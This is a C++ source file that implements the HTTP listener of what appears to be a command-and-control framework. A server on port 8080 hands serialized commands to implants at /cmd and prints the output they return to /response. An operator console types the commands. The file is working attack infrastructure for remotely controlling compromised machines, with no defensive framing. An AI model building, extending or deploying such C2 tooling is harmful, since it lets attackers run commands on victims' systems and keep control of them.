#include "ListenerHttp.hpp"


using namespace std;
using namespace httplib;


std::string dump_headers(const Headers& headers)
{
	std::string s;
	char buf[BUFSIZ];

	for (auto it = headers.begin(); it != headers.end(); ++it) {
		const auto& x = *it;
		snprintf(buf, sizeof(buf), "%s: %s\n", x.first.c_str(), x.second.c_str());
		s += buf;
	}

	return s;
}


ListenerHttp::ListenerHttp(int idxSession, int localPort)
	: Listener(idxSession)
{	
	m_cmd = "";
	this->m_httpServ = std::make_unique<std::thread>(&ListenerHttp::lauchHttpServ, this);
}


ListenerHttp::~ListenerHttp()
{
}


void ListenerHttp::lauchHttpServ()
{
	httplib::Server svr;
	httplib::Response res;

	svr.Get("/cmd", [&](const httplib::Request& req, httplib::Response& res)
	{
		std::string ret = this->setCmd(req, res);
		m_cmd = "";
	});

	svr.Post("/response", [&](const httplib::Request& req, httplib::Response& res)
	{
		std::string ret = this->getResponse(req, res);
	});

	svr.listen("0.0.0.0", 8080);
}


std::string ListenerHttp::getResponse(const httplib::Request& req, httplib::Response& res)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	string ret = req.body;
	C2Message c2RetMessage;
	c2RetMessage.ParseFromArray(ret.data(), (int)ret.size());
	std::cout << "\n\noutput:\n" << c2RetMessage.returnvalue() << std::endl;

	std::string s;
	return s;
}


std::string ListenerHttp::setCmd(const Request& req, Response& res)
{
	std::lock_guard<std::mutex> lock(m_mutex);

	res.body = m_cmd;

	std::string s;
	return s;
};


void ListenerHttp::connectSession()
{
	bool exit = false;
	while (!exit)
	{
		string data;
		data.resize(1000);

		string cmd;
		cout << "session> ";
		getline(cin, cmd);

		std::vector<std::string> splitedCmd;
		std::string delimiter = " ";
		splitList(cmd, delimiter, splitedCmd);

		if (splitedCmd[0].empty())
		{
			std::cout << std::endl;
		}
		else if (splitedCmd[0] == "exit")
		{
			exit = true;
		}
		else
		{
			C2Message c2Message;
			execInstruction(splitedCmd, c2Message);

			std::lock_guard<std::mutex> lock(m_mutex);

			c2Message.SerializeToString(&m_cmd);
		}
	}

	return;
}






/*
char buf[BUFSIZ];

s += "================================\n";

snprintf(buf, sizeof(buf), "%s %s %s", req.method.c_str(),
	req.version.c_str(), req.path.c_str());
s += buf;

std::string query;
for (auto it = req.params.begin(); it != req.params.end(); ++it) {
	const auto& x = *it;
	snprintf(buf, sizeof(buf), "%c%s=%s",
		(it == req.params.begin()) ? '?' : '&', x.first.c_str(),
		x.second.c_str());
	query += buf;
}
snprintf(buf, sizeof(buf), "%s\n", query.c_str());
s += buf;

s += dump_headers(req.headers);

s += "--------------------------------\n";

snprintf(buf, sizeof(buf), "%d %s\n", res.status, res.version.c_str());
s += buf;
s += dump_headers(res.headers);
s += "\n";

if (!res.body.empty()) { s += res.body; }

s += "\n";
*/